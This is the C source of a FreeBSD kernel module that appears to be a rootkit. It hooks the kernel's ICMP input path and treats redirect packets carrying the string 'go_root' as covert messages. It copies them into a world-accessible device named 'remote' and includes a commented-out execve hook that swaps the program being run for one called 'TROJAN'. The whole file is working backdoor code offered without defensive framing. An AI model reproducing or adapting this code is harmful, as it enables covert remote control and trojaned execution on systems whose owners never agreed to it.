#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/sysent.h>
#include <sys/types.h>

#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/exec.h>

#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/lock.h>
#include <sys/sx.h>


#define TRIGGER "go_root"

extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

d_open_t open;
d_close_t close;
d_read_t read;
d_write_t write;


static struct sx buf_lock;

static struct cdevsw cd_remote_cdevsw = {
	.d_version = D_VERSION,
	.d_open = open,
	.d_close = close,
	.d_read = read,
	.d_write = write,
	.d_name = "remote"
};

static char buf[256+1];

int open(struct cdev *dev, int flag, int otyp, struct thread *td)
{
	return 0;
}

int close(struct cdev *dev, int flag, int otyp, struct thread *td)
{
	return 0;
}

int read(struct cdev *dev, struct uio *uio, int ioflag)
{
	int error = 0;

	sx_xlock(&buf_lock);

	int max_length = 256;
	int amnt = MIN(uio->uio_resid, max_length);
	uiomove(buf, amnt, uio);

	bzero(buf, 256);
	sx_xunlock(&buf_lock);
	
	return error;
}

// This device is readonly. Only the kernel can write to this brah.
int write(struct cdev *dev, struct uio *uio, int ioflag)
{
	return 0;
}

static int execve_hook(struct thread *td, void *syscall_args)
{
	struct execve_args *uap = (struct execve_args *)syscall_args;
	char t_fname[] = "TROJAN";
	copyout(t_fname, uap->fname, strlen(t_fname) + 1);

	return sys_execve(curthread, uap);
}

int icmp_input_hook(struct mbuf **mp, int *offp, int proto)
{
	struct icmp *icp;
	int hlen = *offp;

	struct mbuf *m = *mp;

	m->m_len -= hlen;
	m->m_data += hlen;

	icp = mtod(m, struct icmp *);

	m->m_len += hlen;
	m->m_data -= hlen;

	if (icp->icmp_type == ICMP_REDIRECT && icp->icmp_code == ICMP_REDIRECT_TOSHOST 
			&& strncmp(icp->icmp_data, TRIGGER, 6) == 0)
	{
		size_t len;
		sx_xlock(&buf_lock);
		bzero(buf, 256);
		copystr(icp->icmp_data, buf, 256, &len);
		sx_xunlock(&buf_lock);	
		return 0;
	}
	
	return icmp_input(mp, offp, proto);
}

static struct cdev *sdev;

static int load (struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch(cmd) 
	{
		case MOD_LOAD:
			memset(&buf, '\0', 256);
			sx_init(&buf_lock, "lock");
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
			sdev = make_dev(&cd_remote_cdevsw, 0, UID_ROOT, GID_WHEEL, 0666, "remote");
			//sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
			break;
		case MOD_UNLOAD:
			sx_destroy(&buf_lock);
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
			destroy_dev(sdev);
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

static moduledata_t icmp_input_hook_mod = {
	"remote",
	load,
	NULL
};

DECLARE_MODULE(remote, icmp_input_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

